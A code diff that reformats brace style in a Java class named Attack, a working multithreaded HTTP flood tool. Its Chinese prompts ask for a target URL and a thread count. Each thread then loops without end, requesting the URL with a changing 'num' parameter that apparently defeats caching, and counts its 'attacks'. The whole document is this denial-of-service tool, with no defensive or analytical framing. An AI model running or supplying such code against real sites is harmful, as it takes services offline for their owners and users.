@@ -12,38 +12,51 @@ public class Attack implements Runnable {
 	private static long numL = 0;
 	private static Scanner scanner = new Scanner(System.in);
 
-	public void run() {
+	public void run() 
+	{
 		HttpURLConnection connection = null;
 		InputStream urlStream = null;
 		URL url = null;
-		while (true) {
+		while (true) 
+		{
 			try {
 				url = new java.net.URL(strUrl + numL);// 得到URL
 				connection = (java.net.HttpURLConnection) url.openConnection();
 				connection.connect();
 				urlStream = connection.getInputStream();
-				if (urlStream != null) {
+				if (urlStream != null)
+				{
 					++numL;
 					urlStream.close();
 					System.out.println("攻击了" + numL + "次");
 				}
 				Thread.sleep(1);
-			} catch (InterruptedException e) {
+			} 
+			catch (InterruptedException e) 
+			{
 				e.getMessage();
-				try {
+				try
+				{
 					Thread.sleep(1);
-				} catch (InterruptedException ie) {
+				} 
+				catch (InterruptedException ie)
+				{
 					ie.printStackTrace();
 				}
-			} catch (MalformedURLException e) {
+			} 
+			catch (MalformedURLException e)
+			{
 				e.printStackTrace();
-			} catch (IOException e) {
+			} 
+			catch (IOException e)
+			{
 				e.printStackTrace();
 			}
 		}
 	}
 
-	public static void main(String[] args) throws MalformedURLException {
+	public static void main(String[] args) throws MalformedURLException
+	{
 		int threadNum;
 
 		System.out.println("");
@@ -53,15 +66,21 @@ public class Attack implements Runnable {
 			threadNum = scanner.nextInt();
 			System.out.println("请输入要攻击的网址:");
 			String str = scanner.next();
-			if (!str.startsWith("")) {
+			if (!str.startsWith("")) 
+			{
 				strUrl = "http://" + str;
 				System.out.println(strUrl);
-			} else {
+			}
+			else 
+			{
 				strUrl = str;
 			}
-			if (str.indexOf("?") >= 0) {
+			if (str.indexOf("?") >= 0) 
+			{
 				strUrl = strUrl + "&num=";
-			} else {
+			} 
+			else
+			{
 				strUrl = strUrl + "?num=";
 			}
 			System.out.println("--------------------------------------");
@@ -69,15 +88,22 @@ public class Attack implements Runnable {
 			System.out.println("攻击地址" + str);
 			System.out.println("请再次确认(Y/N):");
 			String tmp = scanner.next();
-			if ("Y".equalsIgnoreCase(tmp)) {
+			if ("Y".equalsIgnoreCase(tmp))
+			{
 				break;
-			} else if ("N".equalsIgnoreCase(tmp)) {
-			} else {
+			}
+			else if ("N".equalsIgnoreCase(tmp))
+			{
+			} 
+			else 
+			{
 				System.out.println("输入错误,请重新输入(Y/N):");
 			}
-		} while (true);
+		} 
+		while (true);
 
-		for (int i = 0; i < threadNum; i++) {
+		for (int i = 0; i < threadNum; i++)
+		{
 			Attack at = new Attack();
 			Thread t = new Thread(at);
 			t.start();
